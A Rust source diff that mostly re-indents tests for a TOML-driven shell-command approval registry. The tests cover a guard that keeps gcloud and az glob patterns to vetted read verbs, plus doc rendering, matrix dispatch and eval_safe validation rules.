+/// read-verb set in VERB_GLOB_CLIS; the guard walks that command's tree and fails on any glob token
+/// outside the set (a subgroup name → make it a sub-sub; a mutating/credential verb → drop/carve).
+/// Adding a new cloud CLI (oci, kubectl) is a ONE-ROW entry, not a new bespoke guard.
+#[test]
+fn verb_glob_clis_admit_only_read_verbs() {
+    use super::types::DispatchKind;
+    // (command, vetted read verbs — the ONLY tokens safe to admit via a first_arg glob for it).
+    let verb_glob_clis: &[(&str, &[&str])] = &[
+        (
+            "gcloud",
+            &[
+                "describe", "list", "get-iam-policy", "get-ancestors-iam-policy", "log", "read", "ls",
+                // group-specific analysis reads (no state change), vetted:
+                "compute", "lint-condition", "query-activity", "troubleshoot-policy",
+            ],
+        ),
+        (
+            "az",
+            &[
+                "show", "list", // the generic read verbs
+                // vetted safe list-* variants (metadata, not credentials):
+                "list-locations", "list-sizes", "list-ip-addresses", "list-instances", "list-skus", "list-usages", "list-service-tiers",
+                "list-editions", "list-runtimes", "get-instance-view", "list-deleted", "wait",
+                // group-specific reads (no state change), vetted:
+                "query", "name-exists", "logs",
+            ],
+        ),
+    ];
+    fn walk(prefix: &str, kind: &DispatchKind, read_verbs: &[&str], bad: &mut Vec<String>) {
+        let check = |pfx: &str, patterns: &[String], bad: &mut Vec<String>| {
+            for p in patterns {
+                if !read_verbs.contains(&p.as_str()) {
+                    bad.push(format!("{pfx}: `{p}`"));
+                }
+            }
+        };
+        match kind {
+            DispatchKind::FirstArg { patterns, .. } => check(prefix, patterns, bad),
+            DispatchKind::Branching { subs, first_arg, .. } => {
+                check(prefix, first_arg, bad);
+                for s in subs {
+                    walk(&format!("{prefix} {}", s.name), &s.kind, read_verbs, bad);
+                }
+            }
+            _ => {}
         }
     }
-
-    /// UNIVERSAL structural guard for verb-glob CLIs (#5). A `first_arg` glob matches the FIRST token
-    /// and IGNORES the rest — correct for a VERB glob (`get-*`, `describe`), catastrophic for a glob
-    /// listing SUBGROUP names: `gcloud redis ["instances","operations"]` auto-approves EVERY verb under
-    /// `instances` (create, delete, irreversible-destroy, `get-auth-string`), because dispatch stops at
-    /// the first token. The primitive is sharp on purpose; this guard de-fangs its MISUSE across the
-    /// whole registry. Each hierarchical `<binary> <group> <subgroup…> <verb>` CLI registers its vetted
-    /// read-verb set in VERB_GLOB_CLIS; the guard walks that command's tree and fails on any glob token
-    /// outside the set (a subgroup name → make it a sub-sub; a mutating/credential verb → drop/carve).
-    /// Adding a new cloud CLI (oci, kubectl) is a ONE-ROW entry, not a new bespoke guard.
-    #[test]
-    fn verb_glob_clis_admit_only_read_verbs() {
-        use super::types::DispatchKind;
-        // (command, vetted read verbs — the ONLY tokens safe to admit via a first_arg glob for it).
-        let verb_glob_clis: &[(&str, &[&str])] = &[
-            (
-                "gcloud",
-                &[
-                    "describe", "list", "get-iam-policy", "get-ancestors-iam-policy", "log", "read", "ls",
-                    // group-specific analysis reads (no state change), vetted:
-                    "compute", "lint-condition", "query-activity", "troubleshoot-policy",
-                ],
-            ),
-            (
-                "az",
-                &[
-                    "show", "list",
-                    // vetted safe list-* variants (metadata, not credentials):
-                    "list-locations", "list-sizes", "list-ip-addresses", "list-instances", "list-skus",
-                    "list-usages", "list-service-tiers", "list-editions", "list-runtimes",
-                    "get-instance-view", "list-deleted", "wait",
-                    // group-specific reads (no state change), vetted:
-                    "query", "name-exists", "logs",
-                ],
-            ),
-        ];
-        fn walk(prefix: &str, kind: &DispatchKind, read_verbs: &[&str], bad: &mut Vec<String>) {
-            let check = |pfx: &str, patterns: &[String], bad: &mut Vec<String>| {
-                for p in patterns {
-                    if !read_verbs.contains(&p.as_str()) {
-                        bad.push(format!("{pfx}: `{p}`"));
-                    }
-                }
-            };
-            match kind {
-                DispatchKind::FirstArg { patterns, .. } => check(prefix, patterns, bad),
-                DispatchKind::Branching { subs, first_arg, .. } => {
-                    check(prefix, first_arg, bad);
-                    for s in subs {
-                        walk(&format!("{prefix} {}", s.name), &s.kind, read_verbs, bad);
-                    }
-                }
-                _ => {}
-            }
+    let mut bad = Vec::new();
+    for (cmd, read_verbs) in verb_glob_clis {
+        if let Some(spec) = TOML_REGISTRY.get(*cmd) {
+            walk(cmd, &spec.kind, read_verbs, &mut bad);
         }
-        let mut bad = Vec::new();
-        for (cmd, read_verbs) in verb_glob_clis {
-            if let Some(spec) = TOML_REGISTRY.get(*cmd) {
-                walk(cmd, &spec.kind, read_verbs, &mut bad);
-            }
-        }
-        assert!(
-            bad.is_empty(),
-            "verb-glob CLIs admit non-read tokens ({} — a subgroup name → make it a sub-sub with a \
+    }
+    assert!(
+        bad.is_empty(),
+        "verb-glob CLIs admit non-read tokens ({} — a subgroup name → make it a sub-sub with a \
              read-verb glob; a mutating/credential verb → drop it or carve as credential-read):\n  {}",
-            bad.len(),
-            bad.join("\n  "),
-        );
-    }
+        bad.len(),
+        bad.join("\n  "),
+    );
+}
 
-    #[test]
-    fn all_toml_commands_have_description() {
-        let mut missing = Vec::new();
-        for (key, spec) in TOML_REGISTRY.iter() {
-            if *key != spec.name {
-                continue;
-            }
-            if spec.description.is_empty() {
-                missing.push(spec.name.as_str());
-            }
+#[test]
+fn all_toml_commands_have_description() {
+    let mut missing = Vec::new();
+    for (key, spec) in TOML_REGISTRY.iter() {
+        if *key != spec.name {
+            continue;
         }
-        assert!(
-            missing.is_empty(),
-            "{} TOML commands missing description:\n{}",
-            missing.len(),
-            missing.join(", "),
-        );
+        if spec.description.is_empty() {
+            missing.push(spec.name.as_str());
+        }
     }
+    assert!(missing.is_empty(), "{} TOML commands missing description:\n{}", missing.len(), missing.join(", "),);
+}
 
-    #[test]
-    fn researched_version_round_trips() {
-        let spec = load_one(r#"
+#[test]
+fn researched_version_round_trips() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "demo-cli 1.9.0 (2026-05-08)"
-        "#);
-        assert_eq!(
-            spec.researched_version.as_deref(),
-            Some("demo-cli 1.9.0 (2026-05-08)"),
-        );
-    }
+        "#,
+    );
+    assert_eq!(spec.researched_version.as_deref(), Some("demo-cli 1.9.0 (2026-05-08)"),);
+}
 
-    #[test]
-    fn researched_version_optional_defaults_to_none() {
-        let spec = load_one(r#"
+#[test]
+fn researched_version_optional_defaults_to_none() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "demo"
-        "#);
-        assert!(spec.researched_version.is_none());
-    }
+        "#,
+    );
+    assert!(spec.researched_version.is_none());
+}
 
-    #[test]
-    fn researched_version_does_not_render_in_docs() {
-        // Internal-only field — not rendered as part of the command
-        // doc body. Future commits can add a separate documentation
-        // surface; today the field is purely a tripwire for the next
-        // re-research pass.
-        let spec = load_one(r#"
+#[test]
+fn researched_version_does_not_render_in_docs() {
+    // Internal-only field — not rendered as part of the command
+    // doc body. Future commits can add a separate documentation
+    // surface; today the field is purely a tripwire for the next
+    // re-research pass.
+    let spec = load_one(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "9.9.9"
-        "#);
-        let doc = spec.to_command_doc();
-        assert!(
-            !doc.description.contains("9.9.9"),
-            "researched_version leaked into doc body: {}",
-            doc.description,
-        );
-    }
+        "#,
+    );
+    let doc = spec.to_command_doc();
+    assert!(!doc.description.contains("9.9.9"), "researched_version leaked into doc body: {}", doc.description,);
+}
 
-    #[test]
-    fn handler_command_with_doc_body_renders_body() {
-        let spec = load_one(r#"
+#[test]
+fn handler_command_with_doc_body_renders_body() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "demo"
             handler = "demo_handler"
             doc_body = "- Allowed standalone flags: --foo\n- Allowed valued flags: --bar"
-        "#);
-        let doc = spec.to_command_doc();
-        assert!(doc.description.contains("--foo"), "body missing --foo: {}", doc.description);
-        assert!(doc.description.contains("--bar"), "body missing --bar: {}", doc.description);
-    }
+        "#,
+    );
+    let doc = spec.to_command_doc();
+    assert!(doc.description.contains("--foo"), "body missing --foo: {}", doc.description);
+    assert!(doc.description.contains("--bar"), "body missing --bar: {}", doc.description);
+}
 
-    #[test]
-    fn handler_command_without_doc_body_renders_empty() {
-        let spec = load_one(r#"
+#[test]
+fn handler_command_without_doc_body_renders_empty() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "demo"
             handler = "demo_handler"
-        "#);
-        let doc = spec.to_command_doc();
-        assert_eq!(doc.description, "");
-    }
+        "#,
+    );
+    let doc = spec.to_command_doc();
+    assert_eq!(doc.description, "");
+}
 
-    #[test]
-    fn handler_command_renders_delegating_subs() {
-        // Regression: subs whose kind is DelegateSkip / DelegateAfterSeparator
-        // used to render nothing in SubSpec::doc_line, so handler-using
-        // commands like magick (delegate_skip = 0 on convert/identify) and
-        // php (delegate_skip = 0 on artisan/please) silently dropped
-        // those subs from auto-rendered docs. They must surface as
-        // delegation lines now.
-        let spec = load_one(r#"
+#[test]
+fn handler_command_renders_delegating_subs() {
+    // Regression: subs whose kind is DelegateSkip / DelegateAfterSeparator
+    // used to render nothing in SubSpec::doc_line, so handler-using
+    // commands like magick (delegate_skip = 0 on convert/identify) and
+    // php (delegate_skip = 0 on artisan/please) silently dropped
+    // those subs from auto-rendered docs. They must surface as
+    // delegation lines now.
+    let spec = load_one(
+        r#"
 [[command]]
 name = "demo-delegate"
 handler = "demo_handler"
@@ -5460,32 +5093,22 @@ delegate_skip = 0
 [[command.sub]]
 name = "after"
 delegate_after = "--"
-"#);
-        let doc = spec.to_command_doc();
-        assert!(
-            doc.description.contains("**passthrough**"),
-            "delegate_skip sub label must render: {}",
-            doc.description,
-        );
-        assert!(
-            doc.description.contains("**after**"),
-            "delegate_after sub label must render: {}",
-            doc.description,
-        );
-        assert!(
-            doc.description.contains("delegates"),
-            "delegation must be indicated: {}",
-            doc.description,
-        );
-    }
+"#,
+    );
+    let doc = spec.to_command_doc();
+    assert!(doc.description.contains("**passthrough**"), "delegate_skip sub label must render: {}", doc.description,);
+    assert!(doc.description.contains("**after**"), "delegate_after sub label must render: {}", doc.description,);
+    assert!(doc.description.contains("delegates"), "delegation must be indicated: {}", doc.description,);
+}
 
-    #[test]
-    fn matrix_dispatch_routes_parent_action_to_policy() {
-        // The [[command.matrix]] primitive expresses "parent ∈ list ×
-        // action ∈ map → handler_policy by name." This test exercises:
-        // (a) the simple form (action = "policy_name"), (b) the
-        // detailed form with a guard, (c) auto-render surfaces it.
-        let spec = load_one(r#"
+#[test]
+fn matrix_dispatch_routes_parent_action_to_policy() {
+    // The [[command.matrix]] primitive expresses "parent ∈ list ×
+    // action ∈ map → handler_policy by name." This test exercises:
+    // (a) the simple form (action = "policy_name"), (b) the
+    // detailed form with a guard, (c) auto-render surfaces it.
+    let spec = load_one(
+        r#"
 [[command]]
 name = "demo-matrix"
 handler = "demo_handler"
@@ -5511,47 +5134,37 @@ level = "SafeWrite"
 policy = "download_policy"
 guard = "--output"
 guard_short = "-O"
-"#);
-        match &spec.kind {
-            DispatchKind::Custom { matrices, .. } => {
-                assert_eq!(matrices.len(), 2);
-                assert_eq!(matrices[0].level, SafetyLevel::Inert);
-                assert_eq!(matrices[1].level, SafetyLevel::SafeWrite);
-                let list_action = matrices[0].actions.get("list").expect("list action");
-                assert_eq!(list_action.policy_key, "list_policy");
-                assert!(list_action.guard.is_none());
-                let dl = matrices[1].actions.get("download").expect("download action");
-                assert_eq!(dl.policy_key, "download_policy");
-                assert_eq!(dl.guard.as_deref(), Some("--output"));
-                assert_eq!(dl.guard_short.as_deref(), Some("-O"));
-            }
-            other => panic!("expected Custom, got {other:?}"),
+"#,
+    );
+    match &spec.kind {
+        DispatchKind::Custom { matrices, .. } => {
+            assert_eq!(matrices.len(), 2);
+            assert_eq!(matrices[0].level, SafetyLevel::Inert);
+            assert_eq!(matrices[1].level, SafetyLevel::SafeWrite);
+            let list_action = matrices[0].actions.get("list").expect("list action");
+            assert_eq!(list_action.policy_key, "list_policy");
+            assert!(list_action.guard.is_none());
+            let dl = matrices[1].actions.get("download").expect("download action");
+            assert_eq!(dl.policy_key, "download_policy");
+            assert_eq!(dl.guard.as_deref(), Some("--output"));
+            assert_eq!(dl.guard_short.as_deref(), Some("-O"));
         }
-
-        let doc = spec.to_command_doc();
-        assert!(
-            doc.description.contains("Subcommands by action verb"),
-            "matrix section header must render: {}",
-            doc.description,
-        );
-        assert!(
-            doc.description.contains("alpha, beta"),
-            "parents must render: {}",
-            doc.description,
-        );
-        assert!(
-            doc.description.contains("requires -O/--output"),
-            "guard must render: {}",
-            doc.description,
-        );
+        other => panic!("expected Custom, got {other:?}"),
     }
 
-    #[test]
-    fn matrix_inlines_single_use_policy_summaries() {
-        // Reader-friendly: a matrix action whose policy is referenced
-        // only by that one entry should inline the flag list right
-        // there, not force a scroll to a "shared flag sets" section.
-        let spec = load_one(r#"
+    let doc = spec.to_command_doc();
+    assert!(doc.description.contains("Subcommands by action verb"), "matrix section header must render: {}", doc.description,);
+    assert!(doc.description.contains("alpha, beta"), "parents must render: {}", doc.description,);
+    assert!(doc.description.contains("requires -O/--output"), "guard must render: {}", doc.description,);
+}
+
+#[test]
+fn matrix_inlines_single_use_policy_summaries() {
+    // Reader-friendly: a matrix action whose policy is referenced
+    // only by that one entry should inline the flag list right
+    // there, not force a scroll to a "shared flag sets" section.
+    let spec = load_one(
+        r#"
 [[command]]
 name = "demo-inline"
 handler = "demo_handler"
@@ -5566,28 +5179,26 @@ parents = ["alpha"]
 level = "Inert"
 [command.matrix.actions]
 list = "unique"
-"#);
-        let doc = spec.to_command_doc();
-        assert!(
-            doc.description.contains("--only-here"),
-            "single-use policy flags must inline into the matrix entry: {}",
-            doc.description,
-        );
-        assert!(
-            !doc.description.contains("Shared flag sets"),
-            "shared-flag-sets header must NOT render when all policies are single-use: {}",
-            doc.description,
-        );
-    }
+"#,
+    );
+    let doc = spec.to_command_doc();
+    assert!(doc.description.contains("--only-here"), "single-use policy flags must inline into the matrix entry: {}", doc.description,);
+    assert!(
+        !doc.description.contains("Shared flag sets"),
+        "shared-flag-sets header must NOT render when all policies are single-use: {}",
+        doc.description,
+    );
+}
 
-    #[test]
-    fn sub_with_shared_policy_ref_renders_reference_not_inline() {
-        // Regression: a [[command.sub]] using `policy = "key"` where
-        // the same key is also referenced 2+ times in the matrix must
-        // render the sub as `- **name** — see `key` below`, not
-        // inline the flag list. Otherwise the same list appears in
-        // both the sub bullet and the **Shared flag sets** section.
-        let spec = load_one(r#"
+#[test]
+fn sub_with_shared_policy_ref_renders_reference_not_inline() {
+    // Regression: a [[command.sub]] using `policy = "key"` where
+    // the same key is also referenced 2+ times in the matrix must
+    // render the sub as `- **name** — see `key` below`, not
+    // inline the flag list. Otherwise the same list appears in
+    // both the sub bullet and the **Shared flag sets** section.
+    let spec = load_one(
+        r#"
 [[command]]
 name = "demo-shared-sub"
 handler = "demo_handler"
@@ -5608,29 +5219,27 @@ level = "Inert"
 [command.matrix.actions]
 verify = "canonical"
 watch = "canonical"
-"#);
-        let doc = spec.to_command_doc();
-        assert!(
-            doc.description.contains("**alias-sub**: see `canonical` below"),
-            "sub with shared policy_ref must render as reference: {}",
-            doc.description,
-        );
-        // Unique flag marker appears exactly once — in the shared
-        // section. Not in the sub, not duplicated in the matrix.
-        let count = doc.description.matches("--unique-flag-marker").count();
-        assert_eq!(
-            count, 1,
-            "shared policy flag list must render exactly once (in Shared flag sets): {}",
-            doc.description,
-        );
-    }
+"#,
+    );
+    let doc = spec.to_command_doc();
+    assert!(
+        doc.description.contains("**alias-sub**: see `canonical` below"),
+        "sub with shared policy_ref must render as reference: {}",
+        doc.description,
+    );
+    // Unique flag marker appears exactly once — in the shared
+    // section. Not in the sub, not duplicated in the matrix.
+    let count = doc.description.matches("--unique-flag-marker").count();
+    assert_eq!(count, 1, "shared policy flag list must render exactly once (in Shared flag sets): {}", doc.description,);
+}
 
-    #[test]
-    fn matrix_references_shared_policies_in_their_own_section() {
-        // A policy used 2+ times in the matrix should appear in a
-        // **Shared flag sets** section below, with each matrix entry
-        // referencing it by name instead of duplicating the flag list.
-        let spec = load_one(r#"
+#[test]
+fn matrix_references_shared_policies_in_their_own_section() {
+    // A policy used 2+ times in the matrix should appear in a
+    // **Shared flag sets** section below, with each matrix entry
+    // referencing it by name instead of duplicating the flag list.
+    let spec = load_one(
+        r#"
 [[command]]
 name = "demo-shared"
 handler = "demo_handler"
@@ -5646,32 +5255,26 @@ level = "Inert"
 [command.matrix.actions]
 verify = "shared"
 watch = "shared"
-"#);
-        let doc = spec.to_command_doc();
-        assert!(
-            doc.description.contains("Shared flag sets"),
-            "shared section must render when a policy is used 2+ times: {}",
-            doc.description,
-        );
-        assert!(
-            doc.description.contains("see `shared` below"),
-            "matrix entry must reference the shared policy by name: {}",
-            doc.description,
-        );
-        // Flag list should appear in shared section, not twice inline.
-        let occurrences = doc.description.matches("--web").count();
-        assert_eq!(
-            occurrences, 1,
-            "shared policy flags should appear once (in the shared section), not be duplicated across matrix entries: {}",
-            doc.description,
-        );
-    }
+"#,
+    );
+    let doc = spec.to_command_doc();
+    assert!(doc.description.contains("Shared flag sets"), "shared section must render when a policy is used 2+ times: {}", doc.description,);
+    assert!(doc.description.contains("see `shared` below"), "matrix entry must reference the shared policy by name: {}", doc.description,);
+    // Flag list should appear in shared section, not twice inline.
+    let occurrences = doc.description.matches("--web").count();
+    assert_eq!(
+        occurrences, 1,
+        "shared policy flags should appear once (in the shared section), not be duplicated across matrix entries: {}",
+        doc.description,
+    );
+}
 
-    #[test]
-    fn check_handler_policy_returns_false_for_missing_key() {
-        // Built spec without the requested policy key — handler should
-        // get back `false` (i.e. denial) rather than a panic.
-        let spec = load_one(r#"
+#[test]
+fn check_handler_policy_returns_false_for_missing_key() {
+    // Built spec without the requested policy key — handler should
+    // get back `false` (i.e. denial) rather than a panic.
+    let spec = load_one(
+        r#"
 [[command]]
 name = "demo-cp"
 handler = "demo_handler"
@@ -5679,23 +5282,25 @@ handler = "demo_handler"
 [command.handler_policy.list]
 bare = true
 standalone = ["--help"]
-"#);
-        match &spec.kind {
-            DispatchKind::Custom { handler_policies, .. } => {
-                assert!(handler_policies.contains_key("list"));
-                assert!(!handler_policies.contains_key("nope"));
-            }
-            other => panic!("expected Custom, got {other:?}"),
+"#,
+    );
+    match &spec.kind {
+        DispatchKind::Custom { handler_policies, .. } => {
+            assert!(handler_policies.contains_key("list"));
+            assert!(!handler_policies.contains_key("nope"));
         }
+        other => panic!("expected Custom, got {other:?}"),
     }
+}
 
-    #[test]
-    fn handler_command_renders_subs_and_fallback_data() {
-        // Auto-render: a handler-using command's [[command.sub]] and
-        // [command.fallback] data must surface in the doc description
-        // alongside any handwritten doc_body, so docs stay in sync with
-        // the TOML allowlist instead of relying on hand-edited prose.
-        let spec = load_one(r#"
+#[test]
+fn handler_command_renders_subs_and_fallback_data() {
+    // Auto-render: a handler-using command's [[command.sub]] and
+    // [command.fallback] data must surface in the doc description
+    // alongside any handwritten doc_body, so docs stay in sync with
+    // the TOML allowlist instead of relying on hand-edited prose.
+    let spec = load_one(
+        r#"
 [[command]]
 name = "demo-render"
 handler = "demo_handler"
@@ -5718,43 +5323,21 @@ max_positional = 1
 positional_shape = "path"
 standalone = ["--help"]
 valued = ["--type"]
-"#);
-        let doc = spec.to_command_doc();
-        assert!(
-            doc.description.contains("Routing prose explaining"),
-            "doc_body must still render: {}",
-            doc.description,
-        );
-        assert!(
-            doc.description.contains("**diag**"),
-            "TOML-declared sub `diag` must render: {}",
-            doc.description,
-        );
-        assert!(
-            doc.description.contains("**list**"),
-            "TOML-declared sub `list` must render: {}",
-            doc.description,
-        );
-        assert!(
-            doc.description.contains("Without a subcommand"),
-            "bare-flag section header must render: {}",
-            doc.description,
-        );
-        assert!(
-            doc.description.contains("--type"),
-            "fallback valued flags must render: {}",
-            doc.description,
-        );
-        assert!(
-            doc.description.contains("must look like a path"),
-            "positional_shape must render: {}",
-            doc.description,
-        );
-    }
+"#,
+    );
+    let doc = spec.to_command_doc();
+    assert!(doc.description.contains("Routing prose explaining"), "doc_body must still render: {}", doc.description,);
+    assert!(doc.description.contains("**diag**"), "TOML-declared sub `diag` must render: {}", doc.description,);
+    assert!(doc.description.contains("**list**"), "TOML-declared sub `list` must render: {}", doc.description,);
+    assert!(doc.description.contains("Without a subcommand"), "bare-flag section header must render: {}", doc.description,);
+    assert!(doc.description.contains("--type"), "fallback valued flags must render: {}", doc.description,);
+    assert!(doc.description.contains("must look like a path"), "positional_shape must render: {}", doc.description,);
+}
 
-    #[test]
-    fn handler_sub_with_doc_body_renders_in_parent_body() {
-        let spec = load_one(r#"
+#[test]
+fn handler_sub_with_doc_body_renders_in_parent_body() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "demo"
             bare = false
@@ -5762,102 +5345,102 @@ valued = ["--type"]
             name = "rare-mode"
             handler = "demo_sub"
             doc_body = "requires --opt with one of red, green, blue"
-        "#);
-        let doc = spec.to_command_doc();
-        assert!(
-            doc.description.contains("**rare-mode**"),
-            "body missing sub label: {}",
-            doc.description,
-        );
-        assert!(
-            doc.description.contains("requires --opt"),
-            "body missing sub doc_body: {}",
-            doc.description,
-        );
-    }
+        "#,
+    );
+    let doc = spec.to_command_doc();
+    assert!(doc.description.contains("**rare-mode**"), "body missing sub label: {}", doc.description,);
+    assert!(doc.description.contains("requires --opt"), "body missing sub doc_body: {}", doc.description,);
+}
 
-    #[test]
-    fn handler_sub_without_doc_body_renders_label_only() {
-        let spec = load_one(r#"
+#[test]
+fn handler_sub_without_doc_body_renders_label_only() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "demo"
             bare = false
             [[command.sub]]
             name = "rare-mode"
             handler = "demo_sub"
-        "#);
-        let doc = spec.to_command_doc();
-        assert!(
-            doc.description.contains("**rare-mode**"),
-            "body missing sub label: {}",
-            doc.description,
-        );
-    }
+        "#,
+    );
+    let doc = spec.to_command_doc();
+    assert!(doc.description.contains("**rare-mode**"), "body missing sub label: {}", doc.description,);
+}
 
-    #[test]
-    fn doc_body_does_not_affect_dispatch_for_handler_command() {
-        // Sanity-check: doc_body is purely a docs concern; the handler
-        // is still what gets dispatched. We use a known handler (php)
-        // because tests can't register new handlers at runtime.
-        let spec = load_one(r#"
+#[test]
+fn doc_body_does_not_affect_dispatch_for_handler_command() {
+    // Sanity-check: doc_body is purely a docs concern; the handler
+    // is still what gets dispatched. We use a known handler (php)
+    // because tests can't register new handlers at runtime.
+    let spec = load_one(
+        r#"
             [[command]]
             name = "php"
             handler = "php"
             doc_body = "anything here"
-        "#);
-        // bare php still denied via the handler
-        assert_eq!(
-            super::dispatch_spec(&toks(&["php"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    // bare php still denied via the handler
+    assert_eq!(super::dispatch_spec(&toks(&["php"]), &spec), Verdict::Denied,);
+}
 
-    // eval_safe build-time validation
+// eval_safe build-time validation
 
-    #[test]
-    fn eval_safe_flags_without_tag_is_rejected_at_command_level() {
-        assert_rejected(r#"
+#[test]
+fn eval_safe_flags_without_tag_is_rejected_at_command_level() {
+    assert_rejected(
+        r#"
             [[command]]
             name = "ssh-agent"
             bare = true
             eval_safe_flags = ["-s"]
-        "#, "eval_safe_flags` without `eval_safe = true");
-    }
+        "#,
+        "eval_safe_flags` without `eval_safe = true",
+    );
+}
 
-    #[test]
-    fn eval_safe_flags_without_tag_is_rejected_on_a_sub() {
-        assert_rejected(r#"
+#[test]
+fn eval_safe_flags_without_tag_is_rejected_on_a_sub() {
+    assert_rejected(
+        r#"
             [[command]]
             name = "demo"
             [[command.sub]]
             name = "init"
             eval_safe_flags = ["--shims"]
-        "#, "eval_safe_flags` without `eval_safe = true");
-    }
+        "#,
+        "eval_safe_flags` without `eval_safe = true",
+    );
+}
 
-    #[test]
-    fn eval_safe_command_with_subs_is_rejected() {
-        assert_rejected(r#"
+#[test]
+fn eval_safe_command_with_subs_is_rejected() {
+    assert_rejected(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "test"
             eval_safe = true
             [[command.sub]]
             name = "init"
-        "#, "eval_safe = true` at the command level AND");
-    }
+        "#,
+        "eval_safe = true` at the command level AND",
+    );
+}
 
-    /// Command-level `eval_safe = true` IS allowed alongside
-    /// `handler = "..."`. The walker reads spec.eval_safe directly at
-    /// the leaf; no handler introspection is needed. The contributor
-    /// takes responsibility for vouching that every invocation the
-    /// handler accepts AND that passes the eval_safe_* flag checks
-    /// produces shell-init stdout. Sub-level handler+eval_safe is
-    /// still rejected because it'd require descending the handler's
-    /// own dispatch tree.
-    #[test]
-    fn eval_safe_handler_command_builds() {
-        let spec = load_one(r#"
+/// Command-level `eval_safe = true` IS allowed alongside
+/// `handler = "..."`. The walker reads spec.eval_safe directly at
+/// the leaf; no handler introspection is needed. The contributor
+/// takes responsibility for vouching that every invocation the
+/// handler accepts AND that passes the eval_safe_* flag checks
+/// produces shell-init stdout. Sub-level handler+eval_safe is
+/// still rejected because it'd require descending the handler's
+/// own dispatch tree.
+#[test]
+fn eval_safe_handler_command_builds() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "php"
             researched_version = "test"
@@ -5865,39 +5448,47 @@ valued = ["--type"]
             eval_safe = true
             eval_safe_flags = ["--bash"]
             eval_safe_required_flags = ["--bash"]
-        "#);
-        assert!(spec.eval_safe);
-        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["php", "--bash"])));
-        // Required flag missing => denied.
-        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["php"])));
-    }
+        "#,
+    );
+    assert!(spec.eval_safe);
+    assert!(super::is_eval_safe_for_spec(&spec, &toks(&["php", "--bash"])));
+    // Required flag missing => denied.
+    assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["php"])));
+}
 
-    #[test]
-    fn eval_safe_wrapper_command_is_rejected() {
-        assert_rejected(r#"
+#[test]
+fn eval_safe_wrapper_command_is_rejected() {
+    assert_rejected(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "test"
             eval_safe = true
             [command.wrapper]
             positional_skip = 1
-        "#, "eval_safe = true` AND `[command.wrapper]");
-    }
+        "#,
+        "eval_safe = true` AND `[command.wrapper]",
+    );
+}
 
-    #[test]
-    fn eval_safe_with_deny_is_rejected() {
-        assert_rejected(r#"
+#[test]
+fn eval_safe_with_deny_is_rejected() {
+    assert_rejected(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "test"
             deny = true
             eval_safe = true
-        "#, "deny = true` and `eval_safe = true");
-    }
+        "#,
+        "deny = true` and `eval_safe = true",
+    );
+}
 
-    #[test]
-    fn eval_safe_sub_with_nested_subs_is_rejected() {
-        assert_rejected(r#"
+#[test]
+fn eval_safe_sub_with_nested_subs_is_rejected() {
+    assert_rejected(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "test"
@@ -5906,12 +5497,15 @@ valued = ["--type"]
             eval_safe = true
             [[command.sub.sub]]
             name = "get"
-        "#, "eval_safe = true` AND has nested");
-    }
+        "#,
+        "eval_safe = true` AND has nested",
+    );
+}
 
-    #[test]
-    fn eval_safe_handler_sub_is_rejected() {
-        assert_rejected(r#"
+#[test]
+fn eval_safe_handler_sub_is_rejected() {
+    assert_rejected(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "test"
@@ -5919,12 +5513,15 @@ valued = ["--type"]
             name = "init"
             handler = "php"
             eval_safe = true
-        "#, "eval_safe = true` AND `handler");
-    }
+        "#,
+        "eval_safe = true` AND `handler",
+    );
+}
 
-    #[test]
-    fn eval_safe_delegate_sub_is_rejected() {
-        assert_rejected(r#"
+#[test]
+fn eval_safe_delegate_sub_is_rejected() {
+    assert_rejected(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "test"
@@ -5932,35 +5529,43 @@ valued = ["--type"]
             name = "exec"
             delegate_after = "--"
             eval_safe = true
-        "#, "eval_safe = true` AND delegates");
-    }
+        "#,
+        "eval_safe = true` AND delegates",
+    );
+}
 
-    #[test]
-    fn eval_safe_on_flat_command_builds() {
-        let spec = load_one(r#"
+#[test]
+fn eval_safe_on_flat_command_builds() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "ssh-agent"
             bare = true
             eval_safe = true
             researched_version = "OpenSSH 9.8"
-        "#);
-        assert!(spec.eval_safe);
-        assert!(spec.eval_safe_flags.is_empty());
-    }
+        "#,
+    );
+    assert!(spec.eval_safe);
+    assert!(spec.eval_safe_flags.is_empty());
+}
 
-    #[test]
-    fn eval_safe_command_without_researched_version_is_rejected() {
-        assert_rejected(r#"
+#[test]
+fn eval_safe_command_without_researched_version_is_rejected() {
+    assert_rejected(
+        r#"
             [[command]]
             name = "ssh-agent"
             bare = true
             eval_safe = true
-        "#, "but no `researched_version");
-    }
+        "#,
+        "but no `researched_version",
+    );
+}
 
-    #[test]
-    fn eval_safe_sub_without_command_researched_version_is_rejected() {
-        assert_rejected(r#"
+#[test]
+fn eval_safe_sub_without_command_researched_version_is_rejected() {
+    assert_rejected(
+        r#"
             [[command]]
             name = "demo"
             [[command.sub]]
@@ -5968,12 +5573,15 @@ valued = ["--type"]
             bare = false
             max_positional = 1
             eval_safe = true
-        "#, "but no `researched_version");
-    }
+        "#,
+        "but no `researched_version",
+    );
+}
 
-    #[test]
-    fn eval_safe_sub_with_command_researched_version_builds() {
-        let spec = load_one(r#"
+#[test]
+fn eval_safe_sub_with_command_researched_version_builds() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "demo"
             researched_version = "v1.0"
@@ -5982,17 +5590,19 @@ valued = ["--type"]
             bare = false
             max_positional = 1
             eval_safe = true
-        "#);
-        let DispatchKind::Branching { subs, .. } = &spec.kind else {
-            panic!("expected branching kind");
-        };
-        let init = subs.iter().find(|s| s.name == "init").expect("init sub");
-        assert!(init.eval_safe);
-    }
+        "#,
+    );
+    let DispatchKind::Branching { subs, .. } = &spec.kind else {
